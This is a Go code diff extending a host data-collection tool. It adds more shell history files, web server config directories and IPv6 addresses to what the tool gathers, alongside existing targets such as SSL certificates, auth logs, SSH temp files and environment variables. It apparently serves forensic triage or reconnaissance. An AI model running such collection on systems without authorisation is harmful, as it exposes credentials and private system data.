@@ -31,6 +31,12 @@ func DetectDefaultShell() string {
 		return filepath.Join(currentUser.HomeDir, ".zsh_history")
 	case "bash":
 		return filepath.Join(currentUser.HomeDir, ".bash_history")
+	case "ash":
+		return filepath.Join(currentUser.HomeDir, ".ash_history")
+	case "ksh":
+		return filepath.Join(currentUser.HomeDir, ".ksh_history")
+	case "tcsh":
+		return filepath.Join(currentUser.HomeDir, ".tcsh_history")
 	default:
 		return "" // Unsupported shell
 	}
@@ -69,6 +75,9 @@ func ScanSensitiveFiles(outputDir string) ([]string, error) {
 		"/etc/hostname",      // System hostname
 		"/etc/hosts",         // Hosts file
 		"/etc/ssl",           // SSL certificates
+		"/etc/apache2",       // Apache2 configs
+		"/etc/httpd",         // httpd configs conf/ and conf.d/
+		"/etc/nginx/conf.d",  // nginx configs
 		"/var/log/auth.log",  // Authentication logs (Linux-specific)
 		"/var/log/secure",    // Secure logs (Red Hat/CentOS-specific)
 		"/tmp/ssh-*",         // Temporary SSH files
@@ -97,7 +106,8 @@ func ScanSensitiveFiles(outputDir string) ([]string, error) {
 func expandPath(path string) []string {
 	var fileList []string
 	err := filepath.Walk(path, func(p string, info os.FileInfo, err error) error {
-		if err == nil && !info.IsDir() {
+		// dont collect symlinks that will be dead
+		if err == nil && !info.IsDir() && !filterSymLink(p) {
 			fileList = append(fileList, p)
 		}
 		return nil
@@ -117,6 +127,15 @@ func filterExistingFiles(paths []string) []string {
 		}
 	}
 	return existingFiles
+}
+
+func filterSymLink(filePath string) bool {
+	fileInfo, err := os.Lstat(filePath)
+	if err != nil {
+		// something bad happened if we cant stat the file we dont want to / cant collect it
+		return true
+	}
+	return fileInfo.Mode()&os.ModeSymlink != 0
 }
 
 // saveSystemInfo retrieves and saves environment variables, OS info, and IP addresses.
@@ -167,7 +186,8 @@ func GetSystemInfo() (map[string]interface{}, error) {
 	if err == nil {
 		for _, addr := range addrs {
 			if ip, ok := addr.(*net.IPNet); ok && !ip.IP.IsLoopback() {
-				if ip.IP.To4() != nil {
+				// add support for ipv6 interface collection
+				if ip.IP.To4() != nil || ip.IP.To16() != nil {
 					localIPs = append(localIPs, ip.IP.String())
 				}
 			}
